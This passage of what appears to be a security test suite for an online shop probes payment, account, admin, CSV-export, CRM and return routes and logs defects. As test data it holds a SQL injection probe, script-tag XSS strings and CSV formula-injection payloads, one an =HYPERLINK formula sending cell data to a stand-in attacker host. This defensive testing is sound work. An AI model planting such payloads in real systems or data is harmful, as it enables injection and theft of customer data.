  is(tk.status === 201 && /^ST[0-9A-F]{16}$/.test(tk.json?.ticket?.reference), 'support: a ticket gets an unguessable reference (ST + 64 bits)', tk.json?.ticket?.reference)
  is(leaks(tk.text, V).length === 0, 'support: and naming an order on a ticket returns nothing about that order')
  const ref = tk.json?.ticket?.reference
  const sl = (reference, email) => post(B.base, 'support_lookup', { reference, email }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })
  const sOk = await sl(ref, em); const sWrong = await sl(ref, 'someone-else@guest-orders.invalid'); const sUnk = await sl('ST0000000000000000', em)
  is(sOk.status === 200 && sWrong.status === 404 && sUnk.status === 404 && sWrong.text === sUnk.text, 'support: reference + email shows the ticket; a wrong email and an unknown reference give the same 404', `${sOk.status}/${sWrong.status}/${sUnk.status}`)
  is(leaks(sOk.text, V).length === 0, 'support: the ticket page carries none of the order\'s personal data')
  note('support: order_track_id is free text, never checked against orders; the sender needs no proof of owning it')

  // ---- KNET pay.php, the payment-poll / start route, and the unauthenticated hammering of it
  await sql(`select 1`)
  const kport = await freePort()
  const kout = join(LOGDIR, 'php-knet.out')
  const fsm = await import('node:fs')
  // The gateway as deployed: its own folder with its own config.php (the repo's
  // dropin/php-knet/config.php is the sandbox's and names another database).
  const kdir = join(TMP, 'knet'); fsm.cpSync(KNET_DIR, kdir, { recursive: true, filter: (f) => !/config\.php$/.test(f) || /config\.example\.php$/.test(f) })
  fsm.copyFileSync(join(PRIV, 'knet-config.php'), join(kdir, 'config.php'))
  const kp = spawn('php', [...phpArgs(join(LOGDIR, 'php-knet-error.log')), '-S', `127.0.0.1:${kport}`, '-t', kdir], {
    stdio: ['ignore', fsm.openSync(kout, 'a'), fsm.openSync(kout, 'a')], env: { ...process.env, SPORTA_API_CONFIG_FILE: B.cfgFile },
  })
  procs.push(kp); K = `http://127.0.0.1:${kport}`
  for (let i = 0; i < 60; i++) { await sleep(100); if ((await request(K, 'GET', '/pay.php?trackid=')).status) break }
  const kn = await placeOrder(B, { method: 'knet', ip: newIp(), customer: baseCustomer({ name: `Card${TAG}`, street: `STK${TAG}` }) })
  fx.K = { track: kn.track, id: kn.json?.order_id }
  const pay = (t) => request(K, 'GET', `/pay.php?trackid=${encodeURIComponent(t)}`, { headers: { 'X-Forwarded-Proto': 'https' } })
  const k1 = await pay(kn.track), k2 = await pay('SPNONE' + TAG), k3 = await pay(V.track), k4 = await pay("x' or 1=1")
  is(k1.status === 302 && /^http/.test(k1.headers.location ?? ''), 'KNET pay.php: a pending card order redirects to the bank', `HTTP ${k1.status}`)
  is(k2.status === 404 && /Unknown order/.test(k2.text) && k3.status === 409 && /not payable by KNET/.test(k3.text) && k4.status === 400,
    'KNET pay.php: unknown order 404, a cash order 409, junk 400 (three more existence oracles, no PII)', `${k2.status} ${k3.status} ${k4.status}`)
  is(!/Card|STK|\d{8}/.test(k1.text + k2.text + k3.text) , 'KNET pay.php: and no personal data in any answer')
  const before = Number(await one(`select pay_attempt from orders where track_id=${lit(kn.track)}`))
  const hammer = await Promise.all(Array.from({ length: 30 }, () => pay(kn.track)))
  const after = Number(await one(`select pay_attempt from orders where track_id=${lit(kn.track)}`))
  defect('G14', !(hammer.every((h) => h.status === 302) && after - before === 30),
    'starting a bank payment for an order is limited per client',
    `30 anonymous GETs of /knet/pay.php?trackid=<card order> in a burst: ${hammer.filter((h) => h.status === 302).length} redirects, pay_attempt ${before} -> ${after}; anyone holding a track id can burn the order's attempt counter and the bank reference suffix (A${after})`)
  // the status route is what the result page polls: it needs no token at all
  const poll = await get(B.base, `status&id=${kn.track}`, ip())
  is(poll.status === 200 && poll.json?.payment_status === 'pending' && poll.json?.payment_method === 'knet', 'the payment-result poll is ?r=status with the track id as the only token; there is no second token to get wrong', JSON.stringify(poll.json).slice(0, 100))
  note('a callback (/knet/callback.php) is signed by the bank\'s encryption, not by a token a browser holds; not exercised here (test:knet owns it)')
})

// ============================================================================
// 6  GUEST ORDER vs CUSTOMER ACCOUNT
// ============================================================================
const fx6 = {}
await section('6  guest vs account: does a later account see, claim or leak a guest order?', async () => {
  const jar = () => ({ c: '' })
  const cu = async (j, route, o = {}) => {
    const res = await request(B.base, o.method ?? (o.body === undefined ? 'GET' : 'POST'), `/customer.php?r=${route}${o.q ?? ''}`, {
      headers: { 'X-Forwarded-For': o.ip ?? newIp(), ...(o.body !== undefined ? CUST : {}), ...(j.c ? { Cookie: j.c } : {}) }, body: o.body,
    })
    const set = res.headers['set-cookie']
    if (set) j.c = [].concat(set).map((c) => c.split(';')[0]).join('; ')
    return res
  }
  const P = newPhone(); const E = newEmail()
  const g = []
  for (const label of ['G1', 'G2']) g.push(await placeOrder(B, { ip: newIp(), customer: baseCustomer({ phone: P, name: `Guest${label}${TAG}`, street: `GSTR${label}${TAG}`, note: `GNOTE${label}${TAG}` }) }))
  is(g.every((x) => x.status === 200), 'two guest orders with phone P are placed', g.map((x) => x.status).join())
  const cols = await rows(`select column_name from information_schema.columns where table_schema = database() and table_name = 'orders' and (column_name like '%mail%' or column_name like '%account%' or column_name like '%customer_id%')`)
  is(cols.map((c) => c[0]).join() === 'customer_account_id', 'an order has no email column at all; its only link to an account is customer_account_id', cols.map((c) => c[0]).join())
  const a = jar(); const pw = 'a-long-test-password-' + TAG
  const reg = await cu(a, 'register', { body: { name: 'Account A', email: E, password: pw } })
  is(reg.status === 201 && reg.json?.email === E, 'account A registers with email E (no mailbox check) and is signed in at once', `HTTP ${reg.status}`)
  const verifyCols = await rows(`select column_name from information_schema.columns where table_schema = database() and table_name = 'customer_accounts' and column_name like '%verif%'`)
  is(verifyCols.length === 0, 'there is no email verification state on an account', 'customer_accounts has no *verif* column')
  const ord0 = await cu(a, 'orders')
  is(ord0.status === 200 && ord0.json?.orders?.length === 0, 'my orders for the new account is empty: the earlier guest orders do not appear', JSON.stringify(ord0.json))
  const prof = await cu(a, 'profile', { body: { name: 'Account A', phone: '+965 ' + P } })
  is(prof.status === 200 && prof.json?.phone === '965' + P, 'the account can write the guest\'s phone into its profile; nothing checks that it owns it', `profile phone ${prof.json?.phone}`)
  const ord1 = await cu(a, 'orders')
  is(ord1.json?.orders?.length === 0, 'and with the same phone on the profile, my orders is still empty', JSON.stringify(ord1.json))
  const probes = []
  for (const q of [`&id=${g[0].json.order_id}`, `&order_id=${g[0].json.order_id}`, `&track_id=${g[0].track}`, `&phone=${P}`, `&email=${encodeURIComponent(E)}`, '&page=1&customer_account_id=0']) {
    const r = await cu(a, 'orders', { q }); probes.push(r.text.includes(g[0].track) || r.text.includes(`GSTRG1${TAG}`) || (r.json?.orders?.length ?? 0) > 0)
  }
  is(probes.every((x) => !x), 'extra id / track / phone / email parameters on my orders are ignored: no guest order comes back', probes.join())
  is((await sql(`select count(*) from orders where track_id in (${inList(g.map((x) => x.track))}) and customer_account_id is not null`)) === '0', 'both guest orders are still unowned in the database')

  // B signs up with E's neighbour data and a different mailbox; same phone on profile
  const b = jar(); const EB = newEmail()
  await cu(b, 'register', { body: { name: 'Account B', email: EB, password: pw } })
  await cu(b, 'profile', { body: { name: 'Account B', phone: P } })
  const ordB = await cu(b, 'orders')
  is(ordB.json?.orders?.length === 0, 'a second account that claims the same phone P also sees nothing', JSON.stringify(ordB.json))
  const dup = await cu(jar(), 'register', { body: { name: 'Squatter', email: E.toUpperCase(), password: pw } })
  defect('G9', dup.status !== 409, 'registering an address that already has an account does not say so', `HTTP ${dup.status} ${dup.json?.error}: register tells anyone which emails are customers; forgot_password and login stay uniform`)

  // password-reset path
  const mailsBefore = mails().length
  const fp = await cu(jar(), 'forgot_password', { body: { email: E } })
  const fpUnknown = await cu(jar(), 'forgot_password', { body: { email: newEmail() } })
  is(fp.status === 200 && fp.text === fpUnknown.text, 'forgot password answers {ok:true} the same for a known and an unknown address', fp.text)
  await sleep(400)
  const resetMail = mails().slice(mailsBefore).find((x) => x.text.includes('#token='))
  is(!!resetMail && mails().slice(mailsBefore).length === 1, 'a known address gets exactly one reset mail, an unknown one gets none')
  const token = resetMail?.text.match(/#token=([0-9a-f]{64})/)?.[1]
  is(!!token && !/token=[0-9a-f]{64}\s*&|\?token=/.test(resetMail.text), 'the reset link carries a 256-bit token in the URL fragment (not the query string)')
  const rs = await cu(jar(), 'reset_password', { body: { token, password: 'a-brand-new-password-' + TAG } })
  const rs2 = await cu(jar(), 'reset_password', { body: { token, password: 'another-new-password-' + TAG } })
  is(rs.status === 200 && rs2.status === 400, 'the reset works once; the token is single use', `${rs.status} then ${rs2.status}`)
  const a2 = jar()
  const li = await cu(a2, 'login', { body: { email: E, password: 'a-brand-new-password-' + TAG } })
  const ordR = await cu(a2, 'orders')
  is(li.status === 200 && ordR.json?.orders?.length === 0, 'after the reset, signing in as A still shows no guest order', JSON.stringify(ordR.json))

  // signed-in checkout belongs to the account; nobody else sees it
  const mine = await placeOrder(B, { ip: newIp(), headers: { ...CUST, Cookie: a2.c }, customer: baseCustomer({ name: `Own${TAG}`, street: `OWNST${TAG}` }) })
  const own = await orderRow(mine.track)
  const accId = Number(await one(`select id from customer_accounts where email = ${lit(E)}`))
  is(mine.status === 200 && Number(own?.account) === accId, 'a signed-in checkout stores the account id on the order', `customer_account_id ${own?.account} = account ${accId}`)
  const listA = await cu(a2, 'orders'); const listB = await cu(b, 'orders')
  is(listA.json?.orders?.length === 1 && listA.json.orders[0].track_id === mine.track && listB.json?.orders?.length === 0, 'A sees that one order; B cannot see it', `A ${listA.json?.orders?.length}, B ${listB.json?.orders?.length}`)
  is(!/Own|OWNST|\d{8}/.test(JSON.stringify(listA.json).replace(/\d{4}-\d\d-\d\d[^"]*/g, '').replace(/"amount":[\d.]+/g, '')), 'my orders lists tracking data only (no name, phone, address, note)', Object.keys(listA.json.orders[0]).join(','))
  const fakeHdr = await placeOrder(B, { ip: newIp(), headers: { ...CUST, Cookie: 'sporta_customer=forged' + TAG }, customer: baseCustomer() })
  is(fakeHdr.status === 200 && (await orderRow(fakeHdr.track)).account === null, 'a forged session cookie places a guest order, never an owned one')
  const bodyId = await placeOrder(B, { ip: newIp(), extra: { customer_account_id: accId, account_id: accId }, customer: baseCustomer() })
  is((await orderRow(bodyId.track)).account === null, 'a customer_account_id in the order body is ignored: the browser cannot assign an order to an account')
  // silent downgrade: the password changed elsewhere, the browser still sends the old cookie
  await sql(`update customer_accounts set password_hash = ${lit('$2y$12$vNk3QOHYO.g/y1k6SJzYL.YjGRlwOp9P1TIeCDX.K6s9gFgNI8Bpe')} where id = ${accId}`)
  const stale = await placeOrder(B, { ip: newIp(), headers: { ...CUST, Cookie: a2.c }, customer: baseCustomer() })
  const staleRow = await orderRow(stale.track)
  defect('G10', !(stale.status === 200 && staleRow.account === null && !('signed_in' in (stale.json ?? {}))),
    'an order sent by a browser that believes it is signed in, with a dead session, says it was NOT placed on the account',
    `HTTP ${stale.status}, customer_account_id ${staleRow.account}, answer fields ${Object.keys(stale.json ?? {}).join()}: the order silently becomes a guest order and never shows under "my orders"`)
  // The session the app promises (8 h idle, 7 days) lives in PHP's DEFAULT session store:
  // customer_session_start() never sets session.gc_maxlifetime, so PHP's own 1440 s decides.
  // This server only makes the default 1% garbage collection deterministic (1/1) and puts the
  // session files where the test can age them; the lifetime is untouched.
  const csess = join(TMP, 'csess'); mkdirSync(csess)
  const SS = await startStore('sess', { order_cooldown_seconds: 0, trusted_proxy_ips: LOOP }, ['-d', `session.save_path=${csess}`, '-d', 'session.gc_probability=1', '-d', 'session.gc_divisor=1'])
  const sj = { c: '' }
  const cu2 = async (route, o = {}) => {
    const res = await request(SS.base, o.method ?? (o.body === undefined ? 'GET' : 'POST'), `/customer.php?r=${route}`, { headers: { 'X-Forwarded-For': newIp(), ...(o.body !== undefined ? CUST : {}), ...(sj.c ? { Cookie: sj.c } : {}) }, body: o.body })
    const set = res.headers['set-cookie']; if (set) sj.c = [].concat(set).map((c) => c.split(';')[0]).join('; ')
    return res
  }
  const E2 = newEmail()
  await cu2('register', { body: { name: 'Idle Shopper', email: E2, password: pw } })
  is((await cu2('me')).json?.email === E2, 'a signed-in shopper is recognised straight after signing in')
  const files = readdirSync(csess).filter((f) => f.startsWith('sess_'))
  const old = new Date(Date.now() - 30 * 60 * 1000)
  for (const f of files) (await import('node:fs')).utimesSync(join(csess, f), old, old)
  await cu2('me')                       // the first request after the idle spell: PHP reads, then collects
  const stillMe = await cu2('me')
  const idleOrder = await placeOrder(SS, { ip: newIp(), headers: { ...CUST, Cookie: sj.c }, customer: baseCustomer() })
  const idleRow = await orderRow(idleOrder.track)
  defect('G10b', stillMe.json !== null && idleRow.account !== null,
    'a customer signed in less than the app\'s own 8 hours ago is still signed in after 30 idle minutes',
    `session untouched for 30 min: me -> ${JSON.stringify(stillMe.json)}, then the order has customer_account_id ${idleRow.account}. customer_session_start() never sets session.gc_maxlifetime, so PHP's default 1440 s (24 min) decides, not the 8 h / 7 d in customer_session_valid()`)
  // the admin gate does not honour a customer cookie
  const asCust = await adm('orders', { cookie: b.c })
  is(asCust.status === 401, 'a customer session is not an admin session', `HTTP ${asCust.status}`)
  Object.assign(fx6, { P, E, accId, g })
})

// ============================================================================
// 7  ADMIN: what the staff see, edit, export
// ============================================================================
await section('7  admin: list, edit, audit trail, CSV export, CRM contacts', async () => {
  const noAuth = await adm('orders', { cookie: '' })
  const login = await adminSignIn()
  is(noAuth.status === 401 && noAuth.json?.error === 'not_signed_in', 'the orders list needs a session', `HTTP ${noAuth.status}`)
  is(login.status === 200 && login.json?.email === ADMIN_EMAIL, 'the test admin signs in', `HTTP ${login.status} ${login.text.slice(0, 80)}`)
  const noHdr = await adm('orders', { noHeader: true })
  is(noHdr.status === 400, 'and every route also wants the X-Sporta-Admin header', `HTTP ${noHdr.status}`)
  const V = fx.V
  const list = await adm(`orders&search=${V.track}`)
  const row = list.json?.[0]
  is(list.status === 200 && list.json.length === 1 && row.track_id === V.track, 'search by order number finds the guest order', `HTTP ${list.status}`)
  const want = ['customer_name', 'customer_phone', 'customer_area', 'customer_governorate', 'customer_block', 'customer_street', 'customer_building', 'customer_floor', 'customer_flat', 'customer_note']
  is(want.every((k) => k in row) && row.customer_phone === '965' + V.phone && row.customer_note === V.note, 'the row shows name, full phone, address and the note', want.filter((k) => !(k in row)).join() || 'all present')
  is(!('customer_account_id' in row) && !('customer_email' in row), 'it does not say whether the order is a guest\'s or an account\'s', Object.keys(row).filter((k) => /account|email/.test(k)).join() || 'no account/email field')
  const bySearchPhone = await adm(`orders&search=${V.phone.slice(-8)}`)
  is(bySearchPhone.json?.some((r) => r.track_id === V.track), 'search by phone digits works too')
  const hostile = await placeOrder(B, { ip: newIp(), customer: baseCustomer({ name: `<b>H${TAG}</b>`, note: '<script>alert(1)</script>' }) })
  const hl = await adm(`orders&search=${hostile.track}`)
  is(hl.status === 200 && !/<script|<b>/.test(hl.text) && hl.text.includes('\\u003Cscript\\u003E'), 'script and markup in a guest\'s name and note come out of the admin API hex-escaped, never raw')
  note('the admin screens are React (text nodes, no innerHTML in src/admin/Orders.jsx), so the escaped JSON is also rendered as text')
  if (existsSync(join(ROOT, 'src/admin/Orders.jsx'))) {
    const src = readFileSync(join(ROOT, 'src/admin/Orders.jsx'), 'utf8') + readFileSync(join(ROOT, 'src/admin/api.js'), 'utf8')
    is(!/dangerouslySetInnerHTML|innerHTML\s*=/.test(src), 'and the Orders screen source never injects raw HTML')
  }

  // edit
  const target = await placeOrder(B, { ip: newIp(), customer: baseCustomer({ name: `Edit${TAG}`, street: `OLDST${TAG}`, note: `OLDNOTE${TAG}` }) })
  const tRow = await orderRow(target.track)
  const ed = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { customer_street: `NEWST${TAG}`, customer_note: `NEWNOTE${TAG}`, customer_phone: '+965 ' + newLocal() } } })
  const tAfter = await orderRow(target.track)
  is(ed.status === 200 && tAfter.street === `NEWST${TAG}` && tAfter.note === `NEWNOTE${TAG}` && /^965[569]\d{7}$/.test(tAfter.phone), 'editing the address and the note works, and a typed phone is canonicalised', `HTTP ${ed.status}, phone ${tAfter.phone}`)
  const act = await adm('activity_log')
  const ev = act.json?.events?.find((e) => e.action_key === 'customer' && e.actor_email === ADMIN_EMAIL)
  is(!!ev, 'the edit leaves an entry in the activity log (who, what screen, when)', JSON.stringify(ev))
  defect('G6', !!ev && Object.keys(ev).some((k) => /order|field|before|after|target/.test(k)),
    'the audit entry says which order was changed and from what to what',
    `the entry has only ${Object.keys(ev ?? {}).join(', ')}: action_key "customer". Nothing records the order, the field, the old address or the new one.`)
  const ob = JSON.parse(await one(`select payload from fulfilment_outbox where order_id = ${tRow.id}`) ?? '{}')
  defect('G5', ob.address?.street === `NEWST${TAG}`, 'a corrected address reaches the warehouse message',
    `the queued picking list still says street "${ob.address?.street}" after the edit to "NEWST${TAG}"; the edit does not touch fulfilment_outbox, so the courier gets the OLD address if the mail has not gone yet (up to 5 minutes), and is never told if it has`)
  if (RUN_CRON) {
    const before = mails().length
    await drainFulfilment()
    const m = mails().slice(before).find((x) => x.text.includes(target.track))
    is(!!m && m.text.includes(`OLDST${TAG}`) && !m.text.includes(`NEWST${TAG}`), 'proof: the warehouse mail sent after the edit carries the old street', m ? 'old street in mail' : 'no mail')
  }
  const nothing = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { amount: 0.001, payment_status: 'paid', customer_account_id: fx6.accId, track_id: 'HACK' + TAG } } })
  const still = await orderRow(target.track)
  is(nothing.status === 400 && nothing.json?.error === 'nothing_to_update' && still.account === null && still.pay === 'pending', 'the edit route cannot change money, status, track id or the account: unknown fields are ignored', `HTTP ${nothing.status} ${nothing.json?.error}`)
  const badPhone = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { customer_phone: '12345' } } })
  const badGov = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { customer_governorate: 'mars' } } })
  const longName = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { customer_name: 'x'.repeat(81) } } })
  is(badPhone.json?.error === 'invalid_phone' && badGov.json?.error === 'invalid_governorate' && longName.json?.error === 'too_long_name', 'edits keep the checkout\'s bounds', `${badPhone.json?.error}, ${badGov.json?.error}, ${longName.json?.error}`)
  const blank = await adm('customer', { method: 'POST', body: { order_id: Number(tRow.id), fields: { customer_name: '' } } })
  note('blanking the name through the edit route', `HTTP ${blank.status} ${blank.json?.error ?? 'ok'}`)

  // CSV export (client-side function: src/admin/api.js toCsv)
  const apiSrc = readFileSync(join(ROOT, 'src/admin/api.js'), 'utf8')
  const fnText = apiSrc.match(/export function toCsv\(orders\) \{[\s\S]*?\n\}\n/)?.[0]?.replace('export function', 'function')
  is(!!fnText, 'the export is a function in src/admin/api.js (nothing server-side)')
  const toCsv = new Function(`${fnText}; return toCsv`)()
  const payloads = [['=HYPERLINK("http://evil.invalid/?x="&C2,"open")', 'eq'], ['+1+1+cmd', 'plus'], ['-2+3', 'minus'], ['@SUM(A1:A9)', 'at']]
  const made = []
  for (const [p, k] of payloads) {
    const r = await placeOrder(B, { ip: newIp(), customer: baseCustomer({ name: p.slice(0, 80), street: p.slice(0, 40), area: p.slice(0, 60), note: p.slice(0, 280) }) })
    made.push({ k, p, r })
  }
  is(made.every((m) => m.r.status === 200), 'names, areas, streets and notes that start = + - @ are accepted at checkout (they are valid text)', made.map((m) => m.r.status).join())
  const all = await adm(`orders&search=${TAG.slice(0, 5)}&limit=500`)
  const exportRows = (all.json ?? []).filter((o) => made.some((m) => m.r.track === o.track_id))
  const csv = toCsv(exportRows)
  const cells = csv.split('\n').slice(1).flatMap((l) => l.split(','))
  const armed = cells.filter((c) => /^["]?[=+\-@]/.test(c) && /[=+\-@]/.test(c[0] === '"' ? c[1] : c[0]) && !/^-?\d+(\.\d+)?$/.test(c))
  defect('G4', armed.length === 0, 'a spreadsheet cell that starts = + - @ is neutralised in the CSV export',
    `${armed.length} cells in the export start with a formula character, e.g. ${JSON.stringify(armed[0])}; opened in Excel the courier sheet runs it. name, area, street, building and note are all guest-typed.`)
  const sample = csv.split('\n')[1]
  note('first export line', sample?.slice(0, 160))

  // CRM
  const cp = newPhone(); const variants = ['+965 ' + cp, '965' + cp, '00965' + cp, cp, '965-' + cp]
  const crmOrders = []
  for (const [i, v] of variants.entries()) crmOrders.push(await placeOrder(B, { ip: newIp(), method: i % 2 ? 'knet' : 'cod', customer: baseCustomer({ phone: v, name: `Crm${i}${TAG}` }) }))
  is(crmOrders.every((x) => x.status === 200), 'five orders typed with five spellings of one number are accepted', crmOrders.map((x) => x.status).join())
  // legacy rows from before canonicalisation exist in the live data: make two of them look like that
  await sql(`update orders set customer_phone = ${lit(cp)} where track_id = ${lit(crmOrders[0].track)}`)
  await sql(`update orders set customer_phone = ${lit('+965 ' + cp.slice(0, 4) + '-' + cp.slice(4))} where track_id = ${lit(crmOrders[1].track)}`)
  const crm = await adm(`crm_list&q=${cp}`)
  const hits = (crm.json?.contacts ?? []).filter((c) => c.source === 'phone')
  is(hits.length === 1 && hits[0].key === `phone:965${cp}` && hits[0].order_count === 5, 'the CRM folds +965 / 965 / 00965 / plain / legacy spellings into ONE contact', `${hits.length} contact(s), key ${hits[0]?.key}, ${hits[0]?.order_count} orders`)
  const dupCreate = await adm('crm_create', { method: 'POST', body: { key: `phone:965${cp}`, display_name: 'Dup', status: 'new', tags: [] } })
  const badKey = await adm('crm_create', { method: 'POST', body: { key: `phone:+965${cp}`, display_name: 'Dup', status: 'new', tags: [] } })
  is(dupCreate.status === 409 && dupCreate.json?.error === 'contact_exists' && badKey.status === 400 && badKey.json?.error === 'invalid_contact', 'a second contact for the same number cannot be created by hand', `${dupCreate.json?.error}, ${badKey.json?.error}`)
  const detail = await adm(`crm_detail&key=phone:965${cp}`)
  is(detail.json?.orders?.length === 5, 'the contact page lists all five orders', `${detail.json?.orders?.length}`)
  const nt = await adm('crm_note', { method: 'POST', body: { key: `phone:965${cp}`, note: 'called, will be home after 6' } })
  const ntBad = await adm('crm_note', { method: 'POST', body: { key: `phone:965${cp}`, note: '<script>x</script>' } })
  is(nt.status === 200 && nt.json?.note?.created_by === ADMIN_EMAIL && ntBad.status === 400, 'a CRM note records its author and refuses markup', `${nt.status}/${ntBad.status}`)
  // account vs phone contact: never merged
  const both = await adm(`crm_list&q=${fx6.P}`)
  const kinds = (both.json?.contacts ?? []).map((c) => `${c.source}:${c.order_count}`).sort()
  const phoneC = (both.json?.contacts ?? []).find((c) => c.source === 'phone')
  const accC = (both.json?.contacts ?? []).find((c) => c.key === `account:${fx6.accId}`)
  const pd = await adm(`crm_detail&key=phone:965${fx6.P}`); const ad = await adm(`crm_detail&key=account:${fx6.accId}`)
  const pTracks = (pd.json?.orders ?? []).map((x) => x.track_id), aTracks = (ad.json?.orders ?? []).map((x) => x.track_id)
  is(phoneC?.order_count === 2 && accC?.order_count === 1 && fx6.g.every((x) => pTracks.includes(x.track)) && !aTracks.some((t) => fx6.g.some((x) => x.track === t)),
    'a guest\'s phone contact (2 orders) and an account that put the same phone on its profile stay two contacts, with no order crossing over', `${kinds.join(' ')}; account orders ${aTracks.length}, phone orders ${pTracks.length}`)
  const pf = await adm(`profiles_list&q=${fx6.P}`)
  note('profiles_list for a phone an account copied from a guest', `${pf.json?.profiles?.length ?? 0} profile(s) show it; profile_detail lists only orders with that account id`)
  fx.crm = { cp }
})

// ============================================================================
// 8  CANCEL AND RETURN BY A GUEST
// ============================================================================
await section('8  cancel and return: what a guest can do, with the right and the wrong phone', async () => {
  const cust = (n) => ({ headers: { ...CUST, 'X-Forwarded-For': newIp() }, ...n })
  for (const [b, route] of [[B.base, 'api.php?r=cancel'], [B.base, 'api.php?r=cancel_order'], [B.base, 'api.php?r=order_cancel'], [B.base, 'api.php?r=return_cancel'], [B.base, 'customer.php?r=cancel_order']]) {
    const r = await request(b, 'POST', `/${route}`, { ...cust(), body: { track_id: fx.V.track, phone: fx.V.phone } })
    is(r.status === 404, `no route cancels an order for a customer: ${route}`, `HTTP ${r.status} ${r.json?.error}`)
  }
  note('a guest cannot cancel online. The only paths are the phone / WhatsApp, a return request after delivery, and the 24 h cash auto-cancel')
  const rl = (track, phone) => post(B.base, 'return_lookup', { track_id: track, phone }, cust())
  const rs = (body) => post(B.base, 'return_submit', body, cust())

  // undelivered
  const o1 = await placeOrder(B, { ip: newIp(), items: [{ slug: JACKET, qty: 2, size: 'l' }], customer: baseCustomer({ name: `Ret${TAG}` }) })
  const row1 = await orderRow(o1.track); const phone1 = o1.customer.phone
  const look1 = await rl(o1.track, phone1); const itemId = look1.json?.order?.items?.[0]?.id
  is(look1.status === 200 && look1.json.order.eligibility === 'not_delivered', 'undelivered order: lookup works but eligibility is not_delivered', look1.json?.order?.eligibility)
  const sub = (body) => rs({ track_id: o1.track, phone: phone1, items: [{ order_item_id: itemId, qty: 1, action: 'return', reason: 'size' }], ...body })
  const s0 = await sub({})
  is(s0.status === 400 && s0.json?.error === 'not_delivered', 'undelivered order: a return is refused (not_delivered)', `HTTP ${s0.status} ${s0.json?.error}`)
  const sWrong = await sub({ phone: newLocal() })
  const sOther = await sub({ track_id: fx.W.track })
  is(sWrong.status === 404 && sOther.status === 404, 'a return with the wrong phone, or with my phone on another person\'s order number, is 404', `${sWrong.status}/${sOther.status}`)
  // deliver it through the admin route
  const dv = await adm('fulfilment', { method: 'POST', body: { order_id: Number(row1.id), status: 'delivered' } })
  is(dv.status === 200, 'staff mark the cash order delivered', `HTTP ${dv.status}`)
  const look2 = await rl(o1.track, phone1)
  is(look2.json?.order?.eligibility === 'standard', 'delivered today: standard eligibility', look2.json?.order?.eligibility)
  const s1 = await sub({ note: 'too small' })
  is(s1.status === 201 && /^SR[0-9A-F]{16}$/.test(s1.json?.request?.reference) && s1.json.request.status === 'submitted', 'a return for 1 of 2 pieces is created with an unguessable reference', s1.json?.request?.reference)
  is(![o1.customer.name, o1.customer.street, o1.customer.note, 'too small', phone1.slice(-8)].some((m) => s1.text.includes(m)), 'and the answer carries no personal data (no name, address, note, return note or phone)')
  const s2 = await sub({})
  const s3 = await sub({})
  is(s2.status === 201 && s3.status === 409 && s3.json?.error === 'quantity_exceeded', 'the second piece can be returned, a third attempt cannot (quantity_exceeded)', `${s2.status} then ${s3.status} ${s3.json?.error}`)
  const hist = await rl(o1.track, phone1)
  is(hist.json?.requests?.length === 2, 'the lookup shows both cases in the history', `${hist.json?.requests?.length}`)
  const sNote = await sub({ note: '<script>1</script>' })
  is(sNote.status === 400 && sNote.json?.error === 'invalid_note', 'markup in a return note is refused', `${sNote.json?.error}`)
  // older than 14 days
  const o2 = await placeOrder(B, { ip: newIp(), customer: baseCustomer() })
  const row2 = await orderRow(o2.track)
  await adm('fulfilment', { method: 'POST', body: { order_id: Number(row2.id), status: 'delivered' } })
  await sql(`update orders set fulfilled_at = now() - interval 15 day where id = ${row2.id}`)
  const l2 = await rl(o2.track, o2.customer.phone); const id2 = l2.json?.order?.items?.[0]?.id
  const s4 = await rs({ track_id: o2.track, phone: o2.customer.phone, items: [{ order_item_id: id2, qty: 1, action: 'exchange', reason: 'size', requested_size: 'M' }] })
  is(l2.json?.order?.eligibility === 'manual_review' && s4.status === 201 && s4.json?.request?.eligibility === 'manual_review', 'delivered 15 days ago: accepted but flagged manual_review (the 14-day rule is advisory, a person decides)', `${l2.json?.order?.eligibility}, HTTP ${s4.status}`)
  await sql(`update orders set fulfilled_at = null where id = ${row2.id}`)
  const l3 = await rl(o2.track, o2.customer.phone)
  is(l3.json?.order?.eligibility === 'manual_review', 'delivered with no delivery stamp (old data): manual_review', l3.json?.order?.eligibility)
  // cancelled
  const o3 = await placeOrder(B, { ip: newIp(), customer: baseCustomer() })
  const row3 = await orderRow(o3.track)
  const st0 = await jacketStock()
  const cn = await adm('fulfilment', { method: 'POST', body: { order_id: Number(row3.id), status: 'cancelled' } })
  const l4 = await rl(o3.track, o3.customer.phone)
  is(cn.status === 200 && l4.json?.order?.eligibility === 'not_delivered' && l4.json?.order?.fulfilment_status === 'cancelled', 'a cancelled order cannot be returned', `${l4.json?.order?.fulfilment_status}/${l4.json?.order?.eligibility}`)
  void st0

  // lifecycle: cancelled before the warehouse heard
  if (RUN_CRON) {
    const mails0 = mails().length
    await drainFulfilment()
    is(!mails().slice(mails0).some((x) => x.text.includes(o3.track)), 'an order cancelled before the warehouse was told is never mailed at all', 'no picking list, no do-not-ship')
    // a cash order the warehouse HAS heard of, then cancelled: do-not-ship
    const o4 = await placeOrder(B, { ip: newIp(), customer: baseCustomer() })
    await drainFulfilment()
    const r4 = await orderRow(o4.track)
    const m1 = mails().length
    await adm('fulfilment', { method: 'POST', body: { order_id: Number(r4.id), status: 'cancelled' } })
    await drainFulfilment()
    const dn = mails().slice(m1).find((x) => x.text.includes(o4.track))
    const dnSubj = Buffer.from((dn?.text.match(/^Subject: =\?UTF-8\?B\?([^?]+)\?=/m) ?? [])[1] ?? '', 'base64').toString('utf8')
    is(!!dn && /CANCELLED — do not ship/.test(dnSubj), 'an order cancelled after the picking list went out sends the warehouse a do-not-ship', dnSubj)
    // 24 h cash auto-cancel, and the card hold
    const o5 = await placeOrder(B, { ip: newIp(), items: [{ slug: JACKET, qty: 3, size: 'l' }], customer: baseCustomer() })
    const o6 = await placeOrder(B, { ip: newIp(), method: 'knet', items: [{ slug: JACKET, qty: 2, size: 'l' }], customer: baseCustomer() })
    const o7 = await placeOrder(B, { ip: newIp(), items: [{ slug: JACKET, qty: 1, size: 'l' }], customer: baseCustomer() })
    const sBefore = await jacketStock()
    const ids = [o5, o6, o7].map((x) => x.track)
    await sql(`update orders set created_at = now() - interval 25 hour where track_id in (${inList([o5.track, o7.track])})`)
    await sql(`update orders set created_at = now() - interval 3 hour where track_id = ${lit(o6.track)}`)
